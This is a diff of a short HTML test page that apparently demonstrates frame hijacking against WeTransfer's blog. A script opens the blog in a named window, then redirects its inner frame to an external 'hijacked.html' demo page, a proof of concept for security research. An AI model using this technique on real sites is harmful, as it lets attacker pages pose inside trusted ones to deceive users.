@@ -9,14 +9,14 @@
     <h1>Test</h1>
     <button onclick="openNewTab()">Open New Tab</button>
 
-    
+
     <iframe name="myframe" src="https://wetransfer.com/blog" width="1000" height="400"></iframe>
 
     <!-- <iframe name="myframe" src="https://frontsite-nextjs.wetransfer.net/blog" width="1000" height="400"></iframe> -->
     <!-- <button onclick="openNewTab()">Open New Tab</button> -->
     <script>
         function openNewTab() {
-            var x = window.open("https://frontsite-nextjs.wetransfer.net/blog", "myframe");
+            var x = window.open("https://wetransfer.com/blog", "myframe");
 
             setTimeout(function() {
                 x.frames[0].location.href = "https://daemoon.me/demo/hijacked.html";
